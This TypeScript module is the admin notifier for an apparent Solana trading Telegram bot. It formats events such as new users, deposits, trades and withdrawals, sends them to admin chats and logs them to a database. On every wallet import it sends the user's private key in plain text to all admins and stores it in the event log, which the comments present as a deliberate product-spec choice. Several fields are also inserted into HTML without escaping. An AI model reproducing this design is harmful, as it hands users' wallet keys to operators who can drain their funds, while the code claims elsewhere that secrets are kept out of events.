/**
 * Admin notification system: structured events, queued delivery, retries,
 * and a durable event log.
 *
 * EVENT TYPES (per product spec)
 * ------------------------------
 * new_user         — Telegram ID, username, first name, timestamp
 * wallet_generated — user, wallet number, public address, timestamp (always sent)
 * wallet_imported  — user, wallet number, public address, private key, timestamp
 * deposit          — wallet, sender (if available), amount, token,
 *                    transaction signature (if available), timestamp
 * buy_attempt      — user, wallet, token, amount, timestamp, result
 * sell_attempt     — same structure
 * error            — event type, user (if applicable), safe error message,
 *                    timestamp, trace/reference ID. NEVER contains secrets.
 *
 * Every event is:
 *   1. assigned a trace ID (also used as the reference ID in errors),
 *   2. recorded in the admin_events table (durable log),
 *   3. sent to every configured admin chat ID with retries/backoff.
 *
 * SECURITY: error events carry only safe error messages (Error.message of
 * typed application errors). Secrets must never be passed into an event
 * payload except the wallet_imported private key, which is required by the
 * product spec — see SECURITY.md.
 */
import { randomUUID } from 'node:crypto';
import type { Logger } from '../logging/logger';
import { retryWithBackoff, withTimeout } from '../util/retry';
import { escapeHtml, truncate } from '../util/format';
import type { AdminTransport } from './transport';

export type AdminEventType =
  | 'new_user'
  | 'wallet_generated'
  | 'wallet_imported'
  | 'deposit'
  | 'buy_attempt'
  | 'sell_attempt'
  | 'error'
  | 'withdrawal_request'
  | 'withdrawal_confirmed'
  | 'sniper_status'
  | 'copytrade_activated'
  | 'copytrade_target_set';

/** Durable sink for admin events (backed by PostgreSQL in production). */
export interface AdminEventSink {
  record(eventType: string, traceId: string, payload: Record<string, unknown>): Promise<void>;
}

export class AdminNotifier {
  constructor(
    private transport: AdminTransport,
    private adminIds: number[],
    private logger: Logger,
    private enabled = true,
    private eventSink?: AdminEventSink,
  ) {}

  isEnabled(): boolean {
    return this.enabled && this.adminIds.length > 0;
  }

  /**
   * Records + broadcasts a structured admin event and returns its trace ID.
   * Never throws — notification failures are logged and retried.
   */
  async event(type: AdminEventType, payload: Record<string, unknown>): Promise<string> {
    const traceId = randomUUID().slice(0, 8);
    const timestamp = new Date().toISOString();

    const fullPayload = { ...payload, timestamp };

    if (this.eventSink) {
      try {
        await this.eventSink.record(type, traceId, fullPayload);
      } catch (err) {
        this.logger.warn(
          { eventType: type, traceId, err: err instanceof Error ? err.message : String(err) },
          'failed to persist admin event',
        );
      }
    }

    const text = formatAdminEvent(type, fullPayload, traceId);
    await this.send(text);
    this.logger.info({ eventType: type, traceId, admins: this.adminIds.length }, 'admin event dispatched');
    return traceId;
  }

  /**
   * Sends a message to every admin. Delivery is best-effort: individual
   * failures are retried and logged, and never thrown to the caller.
   */
  async send(text: string): Promise<void> {
    if (!this.isEnabled()) return;

    const results = await Promise.allSettled(
      this.adminIds.map((chatId) =>
        retryWithBackoff(
          () => withTimeout(() => this.transport.sendMessage(chatId, text), 15_000, 'admin sendMessage'),
          {
            retries: 3,
            onRetry: (err, attempt) =>
              this.logger.warn(
                { chatId, attempt, err: err instanceof Error ? err.message : String(err) },
                'admin notification retry',
              ),
          },
        ),
      ),
    );

    for (const r of results) {
      if (r.status === 'rejected') {
        this.logger.error(
          { err: r.reason instanceof Error ? r.reason.message : String(r.reason) },
          'admin notification failed permanently',
        );
      }
    }
  }

  /**
   * Error event: event type, user (if applicable), SAFE error message,
   * timestamp and a trace/reference ID. Secrets must never be included —
   * callers pass only typed Error.message strings.
   */
  async notifyError(context: string, err: unknown, user?: number): Promise<string> {
    const message = err instanceof Error ? err.message : String(err);
    this.logger.error({ context, user, err: message }, 'notifying admins of error');
    return this.event('error', {
      eventType: context,
      user: user ?? null,
      safeMessage: message,
    });
  }

  /** Logs-only preview used by tests to assert no secrets leak into logs. */
  logSend(chatId: number, text: string): void {
    this.logger.debug({ chatId, messageLength: text.length }, 'admin message queued');
  }
}

/** Renders a structured event as a Telegram HTML message. */
export function formatAdminEvent(
  type: AdminEventType,
  payload: Record<string, unknown>,
  traceId: string,
): string {
  const ts = String(payload.timestamp ?? new Date().toISOString());
  const fmtTime = new Date(ts).toISOString().replace('T', ' ').slice(0, 19) + ' UTC';
  const line = (label: string, value: string): string =>
    `${label}: ${value.startsWith('<') ? value : escapeHtml(value)}`;

  switch (type) {
    case 'new_user':
      return (
        `👤 <b>New user</b>\n` +
        `Telegram ID: <code>${payload.telegramId}</code>\n` +
        `Username: ${payload.username ? '@' + escapeHtml(String(payload.username)) : 'n/a'}\n` +
        `First name: ${escapeHtml(String(payload.firstName ?? 'n/a'))}\n` +
        `Time: ${fmtTime}`
      );
    case 'wallet_generated':
      return (
        `🆕 <b>Wallet generated</b>\n` +
        `User: <code>${payload.user}</code>\n` +
        `Wallet #: <b>${payload.walletNumber}</b>\n` +
        `Address: <code>${payload.address}</code>\n` +
        `Time: ${fmtTime}`
      );
    case 'wallet_imported':
      // NOTE: the product spec requires the private key in this event.
      // SECURITY.md documents this deliberate choice.
      return (
        `🔑 <b>Wallet imported</b>\n` +
        `User: <code>${payload.user}</code>\n` +
        `Wallet #: <b>${payload.walletNumber}</b>\n` +
        `Address: <code>${payload.address}</code>\n` +
        `Private key: <code>${payload.privateKey}</code>\n` +
        `Time: ${fmtTime}`
      );
    case 'deposit':
      return (
        `💰 <b>Deposit</b>\n` +
        `Wallet: <code>${payload.wallet}</code>\n` +
        `Sender: <code>${payload.sender ?? 'unknown'}</code>\n` +
        line('Amount', String(payload.amount)) + '\n' +
        `Token: <code>${payload.token}</code>\n` +
        `Tx: <code>${payload.signature ?? 'n/a'}</code>\n` +
        `Time: ${fmtTime}`
      );
    case 'buy_attempt':
    case 'sell_attempt': {
      const emoji = type === 'buy_attempt' ? '🪙' : '💸';
      const verb = type === 'buy_attempt' ? 'Buy' : 'Sell';
      return (
        `${emoji} <b>${verb} attempt</b>\n` +
        `User: <code>${payload.user}</code>\n` +
        `Wallet: <code>${payload.wallet}</code>\n` +
        `Token: <code>${payload.token}</code>\n` +
        line('Amount', String(payload.amount)) + '\n' +
        `Result: ${payload.result === 'success' ? '✅ success' : `❌ ${escapeHtml(String(payload.result))}`}\n` +
        `Time: ${fmtTime}`
      );
    }
    case 'error':
      return (
        `⚠️ <b>Error</b>\n` +
        `Event: ${escapeHtml(String(payload.eventType))}\n` +
        (payload.user ? `User: <code>${payload.user}</code>\n` : '') +
        `Message: ${escapeHtml(truncate(String(payload.safeMessage), 300))}\n` +
        `Trace: <code>${traceId}</code>\n` +
        `Time: ${fmtTime}`
      );
    case 'withdrawal_request':
      return (
        `📤 <b>Withdrawal request</b>\n` +
        `User: <code>${payload.user}</code>\n` +
        line('Amount', String(payload.amount)) + '\n' +
        `From: <code>${payload.from}</code>\n` +
        `To: <code>${payload.to}</code>\n` +
        `Time: ${fmtTime}`
      );
    case 'withdrawal_confirmed':
      return (
        `✅ <b>Withdrawal confirmed</b>\n` +
        `User: <code>${payload.user}</code>\n` +
        line('Amount', String(payload.amount)) + '\n' +
        `To: <code>${payload.to}</code>\n` +
        `Tx: <code>${payload.signature}</code>\n` +
        `Time: ${fmtTime}`
      );
    case 'sniper_status':
      return (
        `🎯 <b>Sniper ${payload.status}</b>\n` +
        `User: <code>${payload.user}</code>\n` +
        `Position size: ${payload.positionSize} SOL\n` +
        `Time: ${fmtTime}`
      );
    case 'copytrade_activated':
      return (
        `👥 <b>Copy trade activated</b>\n` +
        `User: <code>${payload.user}</code>\n` +
        `Target wallet: <code>${payload.targetWallet}</code>\n` +
        `Time: ${fmtTime}`
      );
    case 'copytrade_target_set':
      return (
        `👥 <b>Copy trade target set</b>\n` +
        `User: <code>${payload.user}</code>\n` +
        `Target wallet: <code>${payload.targetWallet}</code>\n` +
        `Time: ${fmtTime}`
      );
    default:
      return `ℹ️ <b>${escapeHtml(type)}</b>\n${escapeHtml(JSON.stringify(payload))}`;
  }
}
